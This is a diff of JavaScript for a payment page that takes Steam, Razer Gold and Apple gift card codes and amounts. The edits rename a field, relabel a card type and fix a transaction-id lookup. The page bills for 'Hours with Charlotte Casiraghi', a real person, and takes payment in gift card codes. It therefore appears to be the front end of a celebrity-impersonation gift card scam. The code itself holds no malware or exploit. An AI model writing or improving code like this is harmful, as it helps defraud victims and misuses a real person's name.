@@ -34,12 +34,13 @@ function initializeState() {
         paypalSections: null,
         BankSection: null,
         redeemSections: null,
+cardAmount:0,
         paymentTimer: null,
         selectedCardType: null,
         giftCardCode: "",
         acceptedCards: [
             { name: "Steam", image: "https://upload.wikimedia.org/wikipedia/commons/8/83/Steam_icon_logo.svg", },
-            { name: "Gold", image: "https://upload.wikimedia.org/wikipedia/commons/d/d7/Gold_icon.svg", },
+            { name: "Razer Gold", image: "https://upload.wikimedia.org/wikipedia/commons/thumb/7/7e/Razer_logo.svg" },
             { name: "Apple", image: "https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg", }
         ]
     };
@@ -745,12 +746,12 @@ function setupGiftCardFormValidation(state) {
 
     function validateForm() {
         state.giftCardCode = codeInput.value.trim();
-        state.amount = amountInput.value.trim();
+        state.cardAmount = amountInput.value.trim();
 
         redeemBtn.disabled = !(
             state.selectedCardType &&
             state.giftCardCode.length > 0 &&
-            state.amount.length > 0
+            state.cardAmount.length > 0
         );
     }
 
@@ -1860,7 +1861,7 @@ function initializePaymentFlow(state, elements) {
                 ? `${details.title.toUpperCase()} - Hours with Charlotte Casiraghi`
                 : details.description || "No description";
 
-        document.getElementById("transaction-id").textContent = transactionId;
+        document.getElementById("transaction-id").textContent = details.transactionId;
         document.getElementById("payment-amount").innerHTML = details.price
             ? `&euro;${details.price.toFixed(2)}`
             : "N/A";
